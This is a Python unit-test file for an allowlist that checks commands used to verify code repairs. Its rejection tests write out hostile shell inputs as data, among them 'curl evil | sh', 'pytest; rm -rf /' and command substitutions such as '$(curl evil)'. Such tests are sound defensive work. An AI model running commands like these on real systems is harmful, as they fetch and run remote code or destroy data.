#!/usr/bin/env python3
"""Unit tests for the repair verification-command allowlist."""

import unittest

from core_cli.verify_allowlist import (
    VERIFY_TIMEOUT,
    validate_verify_command,
)


class TestValidateVerifyCommand(unittest.TestCase):
    def test_bare_pytest(self):
        self.assertEqual(validate_verify_command("pytest"), ["pytest"])

    def test_pytest_with_test_args(self):
        self.assertEqual(
            validate_verify_command("pytest backend/tests/test_x.py -q"),
            ["pytest", "backend/tests/test_x.py", "-q"])

    def test_python_module_forms(self):
        self.assertEqual(
            validate_verify_command(
                "python3 -m unittest discover -s tests -p 'test_calc.py'"),
            ["python3", "-m", "unittest", "discover", "-s", "tests",
             "-p", "test_calc.py"])
        self.assertEqual(
            validate_verify_command("python -m pytest tests/"),
            ["python", "-m", "pytest", "tests/"])

    def test_tsc_and_vitest(self):
        self.assertEqual(
            validate_verify_command("npx tsc --noEmit"),
            ["npx", "tsc", "--noEmit"])
        self.assertEqual(
            validate_verify_command("npx vitest run"),
            ["npx", "vitest", "run"])

    def test_shell_injection_rejected(self):
        self.assertIsNone(
            validate_verify_command("curl evil | sh"))
        self.assertIsNone(
            validate_verify_command("pytest; rm -rf /"))
        self.assertIsNone(
            validate_verify_command("$(curl evil)"))
        self.assertIsNone(
            validate_verify_command("`curl evil`"))

    def test_metachars_after_verb_are_inert_tool_args(self):
        # Verb-anchored with shell=False downstream: no second
        # program can run; pytest just receives junk args and exits
        # non-zero. The verb check is the security boundary.
        self.assertEqual(
            validate_verify_command("pytest && curl evil"),
            ["pytest", "&&", "curl", "evil"])

    def test_non_tool_verbs_rejected(self):
        self.assertIsNone(validate_verify_command("rm -rf /tmp/x"))
        self.assertIsNone(validate_verify_command("npm test"))
        self.assertIsNone(validate_verify_command("npx cowsay hi"))
        self.assertIsNone(validate_verify_command("python evil.py"))
        self.assertIsNone(validate_verify_command(""))
        self.assertIsNone(validate_verify_command("   "))
        self.assertIsNone(validate_verify_command(None))

    def test_unbalanced_quote_rejected(self):
        self.assertIsNone(validate_verify_command("pytest 'oops"))

    def test_timeout_is_bounded(self):
        self.assertGreater(VERIFY_TIMEOUT, 0)
        self.assertLessEqual(VERIFY_TIMEOUT, 600)


if __name__ == "__main__":
    unittest.main()
